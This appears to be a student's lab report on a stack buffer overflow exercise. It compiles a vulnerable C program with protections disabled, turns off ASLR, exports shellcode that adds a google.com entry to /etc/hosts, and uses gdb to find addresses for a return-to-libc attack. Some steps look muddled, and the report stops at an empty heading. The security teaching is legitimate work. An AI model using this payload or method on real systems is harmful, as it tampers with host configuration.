# Lab #1,21110775, Duong Duc Khai, 241INSE330380E_02FIE
# Task 1: Software buffer overflow attack

**Question 1**: 
- Compile asm program and C program to executable code.
- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is  added to the /etc/hosts file on your linux. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.

**Answer 1**:
## 1. Compile asm program to executable code:
*We use nasm to compile to given asm program (the asm program is named shell.asm):*<br>
*Firstly, we assemble the ASM code into an object file:*<br>
```sh
nasm -f elf32 shell.asm -o shell.o
```
*Then, we use the ld linker to create an executable from the object file:*<br>
```sh
ld -m elf_i386 shell.o -o shell
```
<img width="500" alt="Screenshot" src="https://github.com/user-attachments/assets/e7300f5a-bcdf-4f50-ad41-6445c6cf36bd"><br>
## 2. Compile C program to executable code:
*We use gcc to compile to given C program (the C program is named vul1.c):*<br>
*We disable stack canaries using "-fno-stack-protector" and make the stack executable using "-z execstack"*<br>
```sh
gcc -g vul1.c -o vul1.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
```
<img width="500" alt="Screenshot" src="https://github.com/user-attachments/assets/e079c512-33b4-4599-a7fa-c1dd22173ebb"><br>

**Answer 2**:
## 1. Disable ASLR:
*We need to disable aslr to make memory addresses predictable:*<br>
```sh
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
## 2. Convert shellcode to hex:
*We use objdump to convert shellcode to hex code:*<br>
```bash
objdump -d shellcode | grep '[0-9a-f]:' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
```
<img width="500" alt="Screenshot" src="https://github.com/user-attachments/assets/14489ba6-2580-4abf-a61a-38ccca8d586e"><br>
## 3. Create environment variable:
*We'll create an enviroment variable to store the shellcode because the shellcode is 75 bytes and the buffer in the C program is only 16 bytes so it's not possible to inject the whole shellcode into the C program's buffer.:*<br>
```sh
export SHELLCODE=\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d
```
*We can check if the environment variable has been created using echo:*<br>
```sh
echo $SHELLCODE
```
<img width="500" alt="Screenshot" src="https://github.com/user-attachments/assets/0b1e339b-ed6a-43d8-8f0c-be8bdc8f0cf4"><br>
## 4. Attack ideas:
*Firstly, We'll use return-to-libc attack to achieve our goals. To do that, we need to know the addresses of the system, exit, and the SHELLCODE environment variable.:*<br>
*Secondly, we need to craft a string to inject the above addresses into the eip's address, the order will be as following: &system, &exit, &SHELLCODE.:*<br>
## 5. Adding breakpoints:
*We need to run the program using gdb first.:*<br>
```sh
gdb vul1.out -q
```
*Now, we will add a breakpoint at the strcpy's address and one after it. To do that, we'll use the following instruction to see the program's stack:*<br>
```sh
disas main
```
*We can add 2 breakpoints using the following instructions:*<br>
```sh
disas main
```
<img width="500" alt="Screenshot" src="https://github.com/user-attachments/assets/cb53ed87-2475-4e4c-936c-780f0fffbeaf"><br>
## 6. Find addresses:
*We'll run the program.:*<br>
```sh
run aaaa
```
*We'll use the following commands to find the addresses of the system, exit, and SHELLCODE.:*<br>
```sh
print system
print exit
find SHELLCODE
```
<img width="500" alt="Screenshot" src="https://github.com/user-attachments/assets/bc37c3e9-fb85-49da-8119-0aeb5b63cab0"><br>
*We only want the value from the SHELLCODE environment variable, so we'll increment its address by 10 (based on the length of the variable name + 1 for the equal sign). Thus, we get the new address: 0xffffdeef. We can confirm it again using the following command.:*<br>
<img width="500" alt="Screenshot" src="https://github.com/user-attachments/assets/4b5ee748-66dd-4143-adcc-381bf97a7664"><br>
## 7. Find addresses:

